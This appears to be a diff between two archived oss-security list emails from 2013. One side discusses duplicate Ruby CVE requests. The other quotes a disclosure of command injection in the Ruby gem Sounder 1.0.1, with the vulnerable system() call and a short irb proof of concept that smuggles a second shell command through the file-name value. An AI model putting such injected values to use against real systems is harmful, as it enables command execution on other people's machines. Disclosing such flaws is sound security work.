@@ -1,48 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/20/10
-Message-ID: <FC72FC641B949240B947AC6F1F83FBAF0904DE22@IMCMBX01.MITRE.ORG>
-Date: Wed, 20 Mar 2013 14:03:10 +0000
-From: "Christey, Steven M." <coley@...re.org>
-To: Reed Loden <reed@...dloden.com>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-CC: "kseifried@...hat.com" <kseifried@...hat.com>, Henri Salo <henri@...v.fi>, "larry0@...com" <larry0@...com>
-Subject: RE: Re: [Red Hat - Possible Forgery] Re: Ruby CVEs
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/28/8
+Message-ID: <20130828193647.GF31302@kludge.henri.nerv.fi>
+Date: Wed, 28 Aug 2013 22:36:47 +0300
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Subject: Re: Command Injection in Ruby Gem Sounder 1.0.1
 Content-Type: text/plain; charset=utf-8
 
-I agree that oss-security is not just for CVE requests (although that's what it feels like sometimes), but duplicate CVEs are a pain for everybody.  When posting to oss-security, it's reasonable to say whether CVEs have already been requested or not.  There is not a well-established infrastructure or communication channel to closely coordinate CVE assignments between MITRE and Kurt.
+On Wed, Aug 28, 2013 at 03:06:14AM +0000, Larry W. Cashdollar wrote:
+> Title: Command Injection in Ruby Gem Sounder 1.0.1
+> 
+> Date: 8/10/2013
+> Author: Larry W. Cashdollar @_larry0
+> 
+> Download: https://rubygems.org/gems/sounder
+> CVE: TBD
+> Description:
+> 
+> Sounder is a ruby gem API for Mac OSX's afplay command.
+> It passes user supplied data directly to command line.
+> 
+> From lib/sounder/sound.rb:
+> 
+>    def play
+>      system %{/usr/bin/afplay "#{@...e}" &}
+>    end
+> 
+> PoC:
+> 
+> irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
+> => "\"id;/usr/bin/id>/tmp/p;\""
+> irb(main):099:0>  system %{/bin/echo "#{@...e}" }
+> id
+> sh: 1: : Permission denied
+> => false
+> irb(main):100:0>
+> 
+> larry@...erfl0w:/tmp$ cat /tmp/p
+> uid=1000(larry) gid=600(staff) groups=600(user)
+> 
+> Author Notified: 8/9/2013
+> Advisory:  http://vapid.dhs.org/advisories/sounder-ruby-gem-cmd-inj.html
 
-- Steve
+This was the CVE request (just to be clear).
 
+---
+Henri Salo
 
->-----Original Message-----
->From: Reed Loden [mailto:reed@...dloden.com]
->Sent: Wednesday, March 20, 2013 5:19 AM
->To: oss-security@...ts.openwall.com
->Cc: kseifried@...hat.com; Henri Salo; larry0@...com; Christey, Steven M.
->Subject: Re: [oss-security] Re: [Red Hat - Possible Forgery] Re: [oss-security]
->Ruby CVEs
->
->-----BEGIN PGP SIGNED MESSAGE-----
->Hash: SHA1
->
->On Wed, 20 Mar 2013 03:04:30 -0600
->Kurt Seifried <kseifried@...hat.com> wrote:
->
->> Please don't send requests to oss-sec if you already sent a request to
->> Mitre/anyone else. Also I don't seem to have these in my emails from
->> Mitre (to VIM list or anywhere else)?
->
->To be fair, this list isn't just for CVE requests... It's for security
->issues in open source software[0]. As somebody who relies on this list
->and others like it to stay on top of current issues, I definitely
->appreciate the notification, even if CVEs have already been assigned. :)
->
->~reed
->
->[0] http://oss-security.openwall.org/wiki/mailing-lists/oss-security
->-----BEGIN PGP SIGNATURE-----
->Version: GnuPG v1.4.11 (GNU/Linux)
->
->iEYEARECAAYFAlFJfwsACgkQa6IiJvPDPVqSigCfYT4IEI9+DgyaE3UyPCne1/Vb
->RpkAnAmNO0ivQgqqVQuI6CERrAJULa6L
->=MCHH
->-----END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
